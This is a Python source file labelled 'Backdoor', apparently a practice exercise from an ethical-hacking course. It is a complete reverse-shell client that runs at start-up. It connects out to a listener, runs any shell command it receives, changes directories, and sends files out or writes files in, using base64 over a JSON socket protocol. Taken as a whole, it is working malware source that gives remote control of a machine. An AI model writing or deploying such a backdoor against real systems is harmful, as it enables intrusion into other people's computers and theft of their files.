#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# ~^~ author:       pi4as3                      ~^~
# ~^~ description:  Backdoor                    ~^~
# ~^~ version:      0.1.0                       ~^~
"""
@@~~ZSecurity-PythonEthicalHackingFromScratch-Practical-Test~~@@ <-->
&& Version: 1.0 org. - Malware - -- minimal change cause python3.9 &&
"""
import json
import os
import shlex
import socket
import subprocess
import sys
import traceback
import base64
from typing import List, Union, Any, Sequence

# - ## -- ### --- Const --- ### -- ## - #
BUFFERSIZE = 1024


# - ## -- ### --- Backdoor Class --- ### -- ## - #

class Backdoor(object):
    def __init__(self, ip: str = '127.0.0.1', port: int = 26262,
                 server_hello_msg: str = '\n[+] Connection established\n') -> None:
        super(Backdoor, self).__init__()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # - if your Listener wants a message which client and which ip
        # self.connection.send(bytes(server_hello_msg))

    def reliable_send(self, data: Any) -> None:
        json_data = json.dumps(data)
        print(json_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self) -> Any:
        raw_data = b''
        while True:
            packet = self.connection.recv(BUFFERSIZE)
            raw_data += packet
            if len(packet) < BUFFERSIZE:
                break
        print(raw_data)
        if raw_data is '' or None:
            # - By a empty Transmission, return nothing and dont not serialization
            pass
        return json.loads(raw_data.decode())

    def execute_system_command(self, command: Union[bytes, str, Sequence[Union[str, bytes, os.PathLike[str], os.PathLike[bytes]]]]) -> str:
        """ Exec shell command and returns output
        :type command: object
        :param command: execute command list like ['cat', 'longfile.txt'], or a single string like 'cat longfile.txt'
        :return: command output
        """

        try:
            # - create buffer var
            proc_args = []

            # - try to make the best for command input, later more methods for more machines can follow
            if isinstance(command, str):
                proc_args = command.split(' ')
            elif not isinstance(command, list):
                try:
                    proc_args = shlex.split(command)
                except BaseException:
                    pass
            else:
                # - now know! later I find 100% methods for every OS that works to 100% by all that can be come as input
                proc_args = command
            # - Execute the command as list in subprocess on current Platform and return output
            cmd_proc = subprocess.run(args=proc_args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out_buff = cmd_proc.stdout
            if hasattr(out_buff, 'decode'):
                return out_buff.decode()
            else:
                return str(out_buff)
        except FileNotFoundError:
            return f'''cmd_exec_error\nFile not found:\t{traceback.format_exc()}'''
        except (BaseException, Exception):
            return f'''executing_error:\n****************\n{traceback.format_exc()}'''

    def change_working_directory(self, path: Union[int, str, bytes, os.PathLike[str], os.PathLike[bytes]]) -> str:
        try:
            os.chdir(path)
            return f'[+] Changed working directory to {os.getcwd()}'
        except (BaseException, Exception):
            return f'''change_directory_error:\n***********************\n{traceback.format_exc()}'''

    def read_file(self, path) -> str:
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read()).decode()
        except OSError:
            return 'OSError:while_read_file'

    def write_file(self, filename, content) -> str:
        try:
            with open(filename, 'wb') as file:
                file.write(base64.b64decode(content))
            return f'[+] The File {filename} successfully written into {os.getcwd()}'
        except OSError:
            return 'OSError_while_write_file'


    def run(self) -> None:
        while True:
            command: Any = self.reliable_receive()
            if command[0] == 'exit':
                self.connection.close()
                sys.exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            elif command[0] == 'download' and len(command) > 1:
                filepath = command[1]
                if os.path.exists(filepath):
                    command_result = self.read_file(filepath)
                elif os.path.exists(command[1:]):
                    command_result = self.read_file(filepath)
                else:
                    dirlist = os.listdir(os.getcwd())
                    command_result = f'[-] File does not exist, here a list from current directory:\n{dirlist}'
            elif command[0] == 'upload' and len(command) > 2:
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


# - ## -- ### --- Script executing --- ### -- ## - #

bot_platform = Backdoor()
bot_platform.run()
